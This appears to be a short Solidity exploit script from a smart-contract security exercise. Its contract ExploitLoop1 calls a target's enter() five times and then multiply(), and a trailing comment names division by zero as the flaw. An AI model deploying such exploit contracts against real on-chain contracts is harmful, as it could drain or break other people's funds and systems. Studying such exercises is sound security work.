interface ILoop1 {
    function multiply() external;
    function enter() external;
}

contract ExploitLoop1 {
    ILoop1 public loop1Contract;

    constructor(address _loop1Address) {
        loop1Contract = ILoop1(_loop1Address);
    }

    function exploit() public {
        for (uint i = 0; i < 5; i++) {
            loop1Contract.enter();
        }
        loop1Contract.multiply();
    }
}

// Division by zero